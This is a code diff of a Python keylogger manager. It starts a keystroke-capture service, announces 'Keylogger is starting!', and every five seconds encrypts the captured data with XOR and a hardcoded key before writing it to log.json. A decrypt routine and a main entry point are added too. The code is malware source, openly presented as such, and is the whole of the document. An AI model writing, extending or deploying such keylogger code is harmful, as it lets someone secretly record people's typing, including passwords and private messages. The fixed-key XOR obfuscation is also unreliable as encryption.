@@ -1,7 +1,9 @@
+import json
 import time
 from KeyloggerService import KeyLoggerService
-from EncryptionXOR import XOREncryption
-from KeyloggerAgent.FileWrite import FileWriter
+from Encryption import XOREncryption
+from KeyloggerAgent.Write import FileWriter
+
 
 
 
@@ -10,7 +12,7 @@ class KeyLoggerManager:
     def __init__(self):
         self.service = KeyLoggerService()
         self.writer = FileWriter()
-        self.__encryption = XOREncryption('good morning')
+        self.__encryption = XOREncryption('0988977872186763')
 
     def start_listening(self):
         """
@@ -20,8 +22,9 @@ class KeyLoggerManager:
         self.service.start_listening()
         print("Keylogger is starting!")
         while True:
-            time.sleep(10)
-            self._write_to_file(self.encrypt(),'log.json')
+            time.sleep(5)
+            data = self.service.get_data()
+            self._write_to_file(self.encrypt(data),'log.json')
 
     def stop_listening(self):
         """
@@ -29,17 +32,16 @@ class KeyLoggerManager:
         """
         self.service.stop_listening()
 
-    def encrypt(self) -> dict:
+    def encrypt(self , data: dict) -> dict:
         """
         Takes an unencrypted dictionary
          and returns an encrypted dictionary
         """
         temp_dict = dict()
-        data = self.service.get_data()
         for key , val in data.items():
             temp_dict[key] = dict()
             for k , v in val.items():
-                temp_dict[key][k] = self.__encryption.encrypt(v)
+                 temp_dict[key][k] =self.__encryption.encrypt(v)
         return temp_dict
 
 
@@ -53,7 +55,7 @@ class KeyLoggerManager:
         for key, val in data.items():
             temp_dict[key] = dict()
             for k, v in val.items():
-                temp_dict[key][k] = self.__encryption.decrypt(v)
+                temp_dict[key][k] = self.__encryption.decrypt(json.loads(v))
         return temp_dict
 
     def _write_to_file(self,data:dict, file_name:str):
@@ -64,3 +66,7 @@ class KeyLoggerManager:
 
 
 
+if __name__ == '__main__':
+    a = KeyLoggerManager()
+    # a.start_listening()
+    print(a.decrypt())
